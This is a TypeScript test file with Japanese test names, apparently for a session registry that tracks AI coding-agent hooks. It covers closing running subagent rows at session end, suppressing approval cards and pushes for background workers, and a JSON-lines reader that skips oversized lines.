test("unregister（SessionEnd・pid の死）は実行中の行を stopped で閉じる（閉じないと server の写しに「実行中」が残る）", () => {
  const { published, registry } = setup();
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "サブエージェントで調べて" }));
  launchBackgroundAgent(registry, "a1", "toolu_A", "probe sleeper A");
  registry.ingest(
    hook("Stop", {
      last_assistant_message: "launched",
      background_tasks: [{ id: "a1", type: "subagent", status: "running", description: "probe sleeper A", agent_type: "general-purpose" }]
    })
  );
  published.length = 0;
  registry.unregister(SID);
  const closing = published.filter((e) => e.type === "workflow_progress").map((e) => JSON.parse(e.content ?? "{}") as { taskId?: string; agents?: Array<{ id: string; state: string }> });
  const row = closing.find((p) => p.taskId === "subagents")?.agents?.find((a) => a.id === "a1");
  assert.equal(row?.state, "stopped", "実行中の行を閉じる payload を流す");
});

test("claude --bg のワーカー: hooks で載った承認はカードも push も出さず、interrupt は bg の文を返す", async () => {
  const { published, pushes, registry } = setup(new Map(), 0, { isBackgroundWorker: (sid) => sid === SID });
  registry.register(SID, "C:\\w", undefined, undefined);
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "やって" });
  const before = published.length;
  const r = await registry.ingestPermissionHeld({ session_id: SID, tool_name: "Bash", tool_input: { command: "ls" } }, undefined, true);
  assert.equal(r.handled, true);
  assert.equal(r.decision, undefined, "hook の応答は持たない");
  assert.equal(published.length, before, "カードを出さない");
  assert.equal(pushes.length, 0, "誰も見ていなくても push しない");
  assert.equal(await registry.interrupt(SID), BG_INTERRUPT_TEXT);
  // ワーカーでない会話は今までどおりカードを出す。
  const normal = setup(new Map(), 0, { isBackgroundWorker: () => false });
  await normal.registry.ingestPermission({ session_id: SID, tool_name: "Bash", tool_input: { command: "ls" } });
  assert.equal(normal.published.length > 0, true, "カードを出す");
  assert.equal(normal.pushes.length, 1);
});

test("readJsonLines: 改行の無いまま上限まで届いた行は捨てて先へ進み、その後の行は読める", () => {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "buddyos-wb-rjl-")), "t.jsonl");
  try {
    const huge = "x".repeat(100);
    fs.writeFileSync(file, `{"a":"${huge}"}\n{"b":1}\n`);
    // 改行が上限の外にある最初の行: 捨てて進める（止まらない）。
    const first = readJsonLines(file, 0, 20);
    assert.deepEqual(first.lines, []);
    assert.equal(first.next, 20);
    // 進めた先から、最後の行まで読める（途中の行は JSON に読めず捨てられる）。
    let at = first.next;
    const seen: unknown[] = [];
    for (let i = 0; i < 20 && at < fs.statSync(file).size; i += 1) {
      const r = readJsonLines(file, at, 20);
      seen.push(...r.lines);
      at = r.next;
    }
    assert.deepEqual(seen, [{ b: 1 }]);
    // 書きかけ（上限に届かない）は今までどおり待つ。
    fs.writeFileSync(file, '{"c":');
    assert.deepEqual(readJsonLines(file, 0, 20), { lines: [], next: 0 });
  } finally {
    fs.rmSync(path.dirname(file), { recursive: true, force: true });
  }
});
